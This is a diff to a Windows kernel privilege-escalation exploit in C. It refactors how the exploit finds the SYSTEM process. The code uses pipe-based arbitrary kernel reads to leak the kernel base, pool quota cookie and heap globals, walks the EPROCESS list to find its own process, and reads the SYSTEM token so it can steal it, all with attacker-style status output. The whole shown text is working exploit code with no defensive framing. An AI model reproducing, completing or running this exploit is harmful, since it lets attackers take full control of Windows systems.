@@ -46,16 +46,12 @@ uintptr_t findKernelBase(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs)
     return kernel_base;
 }
 
-uintptr_t findSelfEprocess(pipe_pair_t* ghost_pipe, uintptr_t kernel_base)
+uintptr_t findSelfEprocess(pipe_pair_t* ghost_pipe, uintptr_t system_eprocess)
 {
-    uintptr_t PsInitialSystemProcess;
-    ArbitraryRead(ghost_pipe, kernel_base + nt_PsInitialSystemProcess_OFFSET, (char*)&PsInitialSystemProcess, 0x8);
-    printf("[+] PsInitialSystemProcess: 0x%llX\n", PsInitialSystemProcess);
-
     DWORD self_pid = GetCurrentProcessId();
     printf("[*] Searching for current process (PID: %d) in the process list...\n", self_pid);
 
-    uintptr_t current_eprocess = PsInitialSystemProcess;
+    uintptr_t current_eprocess = system_eprocess;
     do
     {
         ArbitraryRead(ghost_pipe, current_eprocess + EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET, (char*)&current_eprocess, 0x8);
@@ -72,7 +68,7 @@ uintptr_t findSelfEprocess(pipe_pair_t* ghost_pipe, uintptr_t kernel_base)
             return current_eprocess;
         }
 
-    } while (current_eprocess != PsInitialSystemProcess);
+    } while (current_eprocess != system_eprocess);
 
     fprintf(stderr, "[-] Failed to locate EPROCESS structure for current process (PID: %d)\n", self_pid);
     return NULL;
@@ -82,7 +78,7 @@ int leakKernelInfo(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs)
 {
     uintptr_t kernel_base = findKernelBase(ghost_pipe, addrs);
     addrs->kernel_base = kernel_base;
-    printf("[+] Kernel base address: 0x%llX\n", kernel_base);
+    printf("[+] Kernel Base: 0x%llX\n", kernel_base);
 
     ArbitraryRead(ghost_pipe, kernel_base + nt_ExpPoolQuotaCookie_OFFSET, (char*)&addrs->ExpPoolQuotaCookie, 0x8);
     printf("[+] ExpPoolQuotaCookie: 0x%llX\n", addrs->ExpPoolQuotaCookie);
@@ -90,7 +86,10 @@ int leakKernelInfo(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs)
     ArbitraryRead(ghost_pipe, addrs->kernel_base + nt_RtlpHpHeapGlobals_OFFSET, (char*)&addrs->RtlpHpHeapGlobals, 0x8);
     printf("[+] RtlpHpHeapGlobals: 0x%llx\n", addrs->RtlpHpHeapGlobals);
 
-    addrs->self_eprocess = findSelfEprocess(ghost_pipe, kernel_base);
+    ArbitraryRead(ghost_pipe, kernel_base + nt_PsInitialSystemProcess_OFFSET, (char*)&addrs->system_eprocess, 0x8);
+    printf("[+] PsInitialSystemProcess: 0x%llX\n", addrs->system_eprocess);
+
+    addrs->self_eprocess = findSelfEprocess(ghost_pipe, addrs->system_eprocess);
     printf("[+] Self EPROCESS: 0x%llX\n", addrs->self_eprocess);
 
     ArbitraryRead(ghost_pipe, (uintptr_t)(addrs->self_eprocess + EPROCESS_KTHREAD_OFFSET), (char*)&addrs->self_kthread, 8);
@@ -151,24 +150,7 @@ int SetupPrimitives(exploit_addresses_t* addrs)
 
 int EscalatePrivileges(exploit_addresses_t* addrs)
 {
-    uintptr_t current_eprocess = addrs->self_eprocess;
-
-    puts("[*] Searching for system eprocess...");
-    while (TRUE)
-    {
-        current_eprocess = Read64(current_eprocess + EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET);
-        current_eprocess -= EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET;
-
-        uintptr_t UniqueProcessId = Read64(current_eprocess + EPROCESS_UNIQUE_PROCESS_ID_OFFSET);
-
-        if (UniqueProcessId == SYSTEM_PID)
-        {
-            printf("[+] System EPROCESS: 0x%llX\n", current_eprocess);
-            break;
-        }
-    }
-
-    uintptr_t system_token = Read64(current_eprocess + EPROCESS_TOKEN_OFFSET);
+    uintptr_t system_token = Read64(addrs->system_eprocess + EPROCESS_TOKEN_OFFSET);
     system_token &= (~0xF); // Clear reference count bits
     printf("[+] System TOKEN: 0x%llX\n", system_token);
 
